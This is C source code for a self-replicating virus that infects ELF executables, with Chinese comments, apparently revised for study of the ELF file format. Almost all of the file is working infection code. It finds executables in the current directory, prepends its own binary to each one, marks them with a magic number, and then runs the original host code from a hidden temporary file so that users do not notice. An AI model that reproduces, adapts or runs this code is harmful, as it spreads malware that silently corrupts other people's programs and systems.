/*
 * virus.c
 *
 * 
 * 修  改:	ZhangJie (hit.zhangjie@gmail.com)
 * 日  期:	24 May 2014
 * 
 * bug/fix：
 * 1）原程序中，病毒文件自身会被其他被感染程序感染，通过添加对病毒程序首次运行
 * 时的检查修正了这一bug 
 * 2）原程序中，被感染程序不能准确地提取原宿主程序交给子进程运行，已改正
 *
 * 感谢程序原作者Mark Swoope，看了作者的程序之后，对病毒程序的逻辑有了了解，同
 * 时也顺便学习了下ELF文件格式，了解了ELF中Program Header Table决定了进程映像
 * 的创建.
 *
 *
 * 这是一个感染ELF可执行程序的简单病毒，检查当前目录下的所有ELF可执行文件，并
 * 在待感染程序的前端插入病毒自身代码，在尾部插入标识文件已被感染的幻数，感染
 * 后的程序结构如下图所示：
 *
 * +-------+
 * | VIRUS |
 * +-------+
 * | HOST  |
 * +-------+
 * | MAGIC |
 * +-------+
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <elf.h>
#include <sys/sendfile.h>
#include <sys/wait.h>

/**
 * 用宏指定病毒文件尺寸的原因如下：
 *
 * 1)在不同的平台上进行编译，编译出的病毒程序尺寸可能不一样，但是我们不能通过
 * stat或者fstat动态获取该文件的尺寸，如果是动态获取的话，当病毒文件感染了其他
 * 宿主程序后，宿主程序再次执行时，动态获取的文件尺寸是被感染后的宿主文件的尺
 * 寸而不是原病毒程序的尺寸，这样可能造成一些莫名奇妙的行为，极易被用户发现
 * 2)假定，用户不会傻到在不了借他人散步的源程序的逻辑之前进行编译运行
 */
#define VIRUS_SIZE 10462

/*病毒程序首次运行时，病毒程序副本文件*/
#define VIRUS_DUPLICATE ".virus"

/*感染宿主程序时创建的临时文件*/
#define VIRUS_TMPHOST	".data.dat"

/*执行被感染的宿主程序的原代码片段时创建的临时文件*/
#define VIRUS_TMPEXEC	".exec"

/*病毒签名，即在被感染程序结尾添加的幻数*/
#define VIRUS_MAGIC	7177135

/*病毒代码感染其他宿主程序后执行的附加例程*/
void payload() {
	fputs("This is the virus payload.\n", stdout);
}

/**
 * 病毒文件或者已被感染的宿主文件vfd，感染未被感染的宿主文件host，将病毒文件的
 * 代码插入宿主文件 
 * @param vfd 病毒的可执行二进制对象文件打开后的文件描述符
 * @param host 待感染的宿主文件
 * @return 感染成功返回1，其他返回0
 */
int infect(int vfd, const char *host) {
	int tfd, hfd, magic;
	ssize_t n;
	unsigned char e_ident[EI_NIDENT];
	uint16_t e_type;
	struct stat st;
	
	// 打开待感染的宿主文件
	hfd = open(host, O_RDONLY);
	if (hfd == -1) 
		return 0;
	
	// 读取Elf32_Ehdr或者Elf64_Ehdr中的e_ident[EI_NIDENT]数组内容，该数组标识
	// 包含了ELF文件的某些识别信息
	if (read(hfd, e_ident, EI_NIDENT) < EI_NIDENT)
		return 0;

	// 检查待感染文件前4字节的幻数，判断文件是否为ELF文件
	if (
		e_ident[EI_MAG0] != ELFMAG0 ||
		e_ident[EI_MAG1] != ELFMAG1 ||
		e_ident[EI_MAG2] != ELFMAG2 ||
		e_ident[EI_MAG3] != ELFMAG3 
	) 
		return 0;

	// 读取Elf32_Ehdr或者Elf64_Ehdr中e_type成员，该成员标识了对象文件的类型
	if (read(hfd, &e_type, sizeof(e_type)) < sizeof(e_type))
		return 0;

	// 检查是否是可执行对象文件或共享对象对象文件
	if (e_type != ET_EXEC && e_type != ET_DYN) 
		return 0;

	// 宿主Elf可执行对象程序被感染后，会在文件尾追加幻数，通过检查此幻数是否存
	// 在判断文件是否已被感染
	lseek(hfd, sizeof(magic) * -1, SEEK_END);
	read(hfd, &magic, sizeof(magic));
	if (magic == VIRUS_MAGIC) 
		return 0;
	magic = VIRUS_MAGIC;

	// 定位到病毒文件或已被感染文件、宿主文件的文件头，准备感染宿主文件
	lseek(vfd, 0, SEEK_SET);
	lseek(hfd, 0, SEEK_SET);
	fstat(hfd, &st);
	
	// 创建临时文件，存储病毒文件或已被感染文件代码和宿主文件代码
	tfd = creat(VIRUS_TMPHOST, st.st_mode);
	if (tfd == -1) 
		return 0;

	// 将病毒文件或已被感染文件的代码插入临时文件中
	sendfile(tfd, vfd, NULL, VIRUS_SIZE);
	// 将宿主文件代码插入临时文件中
	sendfile(tfd, hfd, NULL, st.st_size);	
	// 将幻数写入文件尾，标识该文件已被感染
	write(tfd, &magic, sizeof(magic));

	close(tfd);
	close(hfd);

	// 将临时文件更名为宿主文件名，取代待感染的宿主文件
	rename(VIRUS_TMPHOST, host);
	return 1;
}

int main(int argc, char *const argv[], char *const envp[]) {
	DIR *dir;
	struct dirent *ent;
	struct stat st;
	int vfd, xfd, magic;
	pid_t pid;
	off_t offset;
	ino_t inode;

	// 打开可执行二进制对象文件virus自身
	vfd = open(argv[0], O_RDONLY);
	fstat(vfd, &st);
	inode = st.st_ino;

	// 寻找当前目录下待感染的文件
	dir = opendir(".");
	for (ent = readdir(dir); ent != NULL; ent = readdir(dir)) {

		// 目录文件.\..以及隐藏文件免疫
		if (ent->d_name[0] == '.') 
			continue;

		// 特殊文件免疫
		stat(ent->d_name, &st);
		if (!S_ISREG(st.st_mode)) 
			continue;

		// 病毒文件自身免疫
		if (st.st_ino == inode) 
			continue;

		// 感染目标文件
		infect(vfd, ent->d_name);
	}				
	closedir(dir);

	// 当前病毒实例中，先感染其他ELF可执行文件，再执行病毒的其他破坏操作
	payload();

	fstat(vfd, &st);

	// 检测当前进程是否是运行的原病毒程序
	offset = lseek(vfd, 0, SEEK_END);

	if(offset==VIRUS_SIZE) {
		int _vfd_ = creat(VIRUS_DUPLICATE, st.st_mode);
		if(_vfd_ < 0)
			return -1;

		// 在原病毒程序的结尾处添加幻数，避免病毒程序被其他被感染程序感染
		int magic = VIRUS_MAGIC;
		lseek(vfd, 0, SEEK_SET);
		sendfile(_vfd_, vfd, NULL, st.st_size);
		write(_vfd_, &magic, sizeof(magic));
		close(vfd);
		close(_vfd_);
		rename(VIRUS_DUPLICATE, argv[0]);
		return 0;
	}

	// 如果当前程序不是病毒原程序，而是被感染后的宿主程序，那么病毒代码将提取
	// 原宿主程序的代码，存储到VIRUS_TMPEXEC中，宿主原程序将由创建的子进程执行
	// 
	// 注意：病毒程序执行后，并没有在病毒原程序的结尾写入幻数，所以其他被感染
	// 的宿主程序再次运行的时候，会感染当前病毒程序；当病毒程序被感染，病毒程
	// 序再次运行时，也会创建子进程，子进程执行的也是原病毒代码片段
	xfd = creat(VIRUS_TMPEXEC, st.st_mode);

	// 将当前被感染程序，定位到原宿主程序的位置
	offset = lseek(vfd, VIRUS_SIZE, SEEK_SET);

	// 忽略病毒在被感染程序末尾添加的幻数
	offset += sizeof(magic);
	sendfile(xfd, vfd, NULL, st.st_size - offset);
	close(xfd);
	close(vfd);

	// 运行宿主程序
	pid = fork();
	if (pid == 0) 
	{
		// 当通过命令行调用的程序包含参数时，将参数原封不动
		// 地传递给原宿主程序
		exit(execve(VIRUS_TMPEXEC, argv, envp));
	}

	waitpid(pid, NULL, 0);
	unlink(VIRUS_TMPEXEC);
	return 0;		
}
